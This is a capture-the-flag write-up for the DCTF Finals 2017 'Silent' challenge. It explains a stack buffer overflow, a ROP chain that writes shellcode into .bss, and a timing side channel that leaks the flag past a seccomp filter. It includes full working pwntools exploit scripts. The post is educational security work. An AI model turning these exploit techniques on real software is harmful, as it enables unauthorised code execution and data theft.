---
layout: post
ctf: "DCTF Finals 2017"
title:  "DCTF Finals 2017 - Pwning - Silent"
author: "jfgauron"
---

We are given a binary: silent and we are asked to read `flag`. First, I ran `checksec silent` to see what kind of protection it had:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

That's nice, it offers almost no protection. Next, I ran it using `strace ./silent`:

```
...
read(0, test
"test\n", 1024)                 = 5
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
write(1, "Hi test, how is your weather?\n", 30Hi test, how is your weather?
) = 30
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_DUMPABLE, 0)               = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, 0x601190) = 0
lseek(0, -1, SEEK_CUR)                  = -1 ESPIPE (Illegal seek)
exit_group(0)                           = ?
+++ exited with 0 +++
```

We see that the binary asks for an input, then it prints 'Hi %s, how is your weather?' where %s is our input. The third `prctl` call: `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, 0x601190)` is quite intersting. What it does, basically, is limit the available system calls. It accepts a pointer to a `struct sock_fprog` as its 3rd argument. `sock_fprog` is defined as:

```C
struct sock_fprog {
    unsigned short         len;         /* Number of filter blocks */
    struct sock_filter __user *filter;  /* array of filter blocks */
};

```
Furthermore, `sock_filter` is defined as:
```C
struct sock_filter {    /* Filter block */
    __u16   code;   /* Actual filter code */
    __u8    jt;     /* Jump true */
    __u8    jf;     /* Jump false */
    __u32   k;      /* Generic multiuse field */
};
```

How it works is a little bit complicated. If you want to learn more, I encourage you to read this: [Linux kernel filter](https://www.kernel.org/doc/Documentation/networking/filter.txt). Otherwise, if you are lazy, you can simply use this IDA plugin: [ida-bpf-processor](https://github.com/bdr00/ida-bpf-processor). Using the plugin, I quickly found out that almost all syscalls were blocked, except for these:

```
sys_exit_group
sys_brk
sys_mmap
sys_munmap
sys_read
sys_mprotect
sys_lseek
sys_poll
sys_lstat
sys_fstat
sys_stat
sys_close
sys_open
```

Okay, so we have a pretty good idea of what the binary does, time to find the exploit! Let's take a look at our main function:

```ASM
0x000000000040071b:  push   rbp
0x000000000040071c:  mov    rbp,rsp
0x000000000040071f:  sub    rsp,0x550
0x0000000000400726:  mov    DWORD PTR [rbp-0x544],edi
0x000000000040072c:  mov    QWORD PTR [rbp-0x550],rsi
0x0000000000400733:  lea    rax,[rbp-0x540]
0x000000000040073a:  mov    rsi,rax
0x000000000040073d:  mov    edi,0x400814
0x0000000000400742:  mov    eax,0x0
0x0000000000400747:  call   0x400580 <__isoc99_scanf@plt>
...
```
As long as our payload do not contains any whitespace, we can trigger a buffer overflow and overwrites the return value of main. Let's recap what we know so far:

1) The buffer overflows allows us to jump anywhere we want.

2) We have many areas in memory that are both writable and executable.

3) We are severly limited by what syscalls we can do.


First, let's focus on finding a way to execute arbitrary code. We know our stack is executable, but finding its address looked somewhat hard with the gadgets available. Instead, it's possible to build a ROP chain that jump back in scanf and write at an address we control, and then return at said address. To do this, we used these gadgets:

```ASM
# 0x00000000004007f1 : pop rsi ; pop r15 ; ret          /* set rsi */
# 0x00000000004007f3 : pop rdi ; ret                    /* set rdi */
```

We decided to write and jump in .bss, since it was an easy target. Here is a script showing that our exploit works:

```python
#!/usr/bin/env python2
from pwn import *

context.log_level = 'debug'
context.arch='amd64'

def rem():
    url  = "silent.kv-server.dctf-f1nals-2017.def.camp"
    port = 3333
    return remote(url, port)

def loc():
    return process("./silent")

elf = ELF('./silent')
p   = loc()

# rop gadgets 
pop_rsi  = 0x4007f1 # pop rsi ; pop r15 ; ret 
pop_rdi  = 0x4007f3 # pop rdi ; ret
s_format = 0x400814 # pointer to "%s"

# Buffer overflow + ROP chain to write and jump in bss
payload  = '\x90'*1352 # enough junk to overflow rbp, but not ret
payload += p64(pop_rsi) + p64(elf.bss()) + p64(0)
payload += p64(pop_rdi) + p64(s_format)
payload += p64(elf.plt['__isoc99_scanf'])
payload += p64(elf.bss())
p.sendline(payload)

# abtrirary code we want executed
code = asm("jmp $")
p.sendline(code)

p.interactive()
```

When running this script, the binary ask for input a second time, and then jump in an infinite loop. We know it works because the process is stuck in an infinite loop and never dies. Success! Our arbitrary code is executed :D

Okay so we can execute arbitrary code, open and read a file, but how will we output the result without sys_write? Answer: We won't! We will simply test each characters found in `flag` one by one, and do one of two things: If the characters do not match our prediction, we will segfault and test another one. If the characters match, we will enter an infinite loop. If the process has not died after X seconds, we know we found the good character and can move on to the next one.

So we wrote the script, tested it locally... and got the flag!! That means we are done, right? Wrong. Our script failed miserably when trying it remotely. This was wierd, since we were not using anything specific to our local platform. So I went to the admins looking like this:

![fail](/img/writeups/itworksonmymachine.png)

They quickly realized the problem and told all teams how they were starting the process on their end:

`socat TCP4-LISTEN:7777,reuseaddr,fork  EXEC:./silent,pty,ctty,echo=0`

Sure enough, testing it locally with socat and these parameters resulted in failure... Turns out some of the bytes used in our payload are special characters for socat, which resulted in unexpected behaviour... After a couple more tries, we finally ended up with a working script:

```
#!/usr/bin/env python2
from pwn import *
import time

context.log_level = 'error'
context.arch='amd64'

def rem():
    url  = "silent.kv-server.dctf-f1nals-2017.def.camp"
    port = 3333
    return remote(url, port)

# if using loc, starts the process with: socat TCP4-LISTEN:77,reuseaddr,fork  EXEC:./silent,pty,ctty,echo=0
def loc():
    url  = "localhost"
    port = 7777
    return remote(url, port)

elf = ELF('./silent')

# rop gadgets 
pop_rsi  = 0x4007f1        # pop rsi ; pop r15 ; ret 
pop_rdi  = 0x4007f3        # pop rdi ; ret
s_format = 0x400814        # pointer to "%s"
bss      = elf.bss()+0x100 # +0x100 to avoid having 0x11 (socat special char.) in our payload

#flag_chars = 'D'
flag_chars = "DCTF{}0123456789abcdef"
filename   = "flag\x00"
answer     = ""
while(1):
    current_len = len(answer)
    for target in flag_chars:
        p = loc()

        # Buffer overflow + ROP chain to write and jump in .bss
        payload  = '\x90'*1352 # enough junk to overflow rbp, but not ret
        payload += p64(pop_rsi) + p64(bss) + p64(0) 
        payload += p64(pop_rdi) + p64(s_format)
        payload += p64(elf.plt['__isoc99_scanf'])
        payload += p64(bss + len(filename))
        p.sendline(payload)

        # abtrirary code we want written and executed in .bss
        code  = filename
        code += asm("""
        open_file:
            mov rdi, 0x%lx
            xor rsi, rsi
            mov rax, 2
            syscall

        read_char_at_index:
            movsxd r15, eax
            mov r14, %d
            xor r14, 128
        read_char:
            movb [0x%lx], ah
            mov rax, 0
            mov rdi, r15
            mov rsi, 0x%lx
            mov rdx, 1
            syscall
            dec r14
            cmp r14, 0
            jnz read_char

        test_char:
            movb ah, [0x%lx]
            cmp ah, 0x%lx
            je $

        bad_char:
            mov rax, [0xffffffffffff]
        """ % (bss, (len(answer)+1)|128, bss, bss, bss, ord(target)))
        p.sendline(code)

        try:
            start = time.time()
            p.recvall(timeout=1)      
            if time.time() - start > 1:
                answer += target
                print(answer)
                break
        except:
            pass

    if current_len == len(answer):
        print "Flag: " + answer
        exit()
```

and got the flag: `DCTF{167d5c9df2265fec06b6c292aabdb8189f234e72f710c8a771bb9d5645163bdd}`
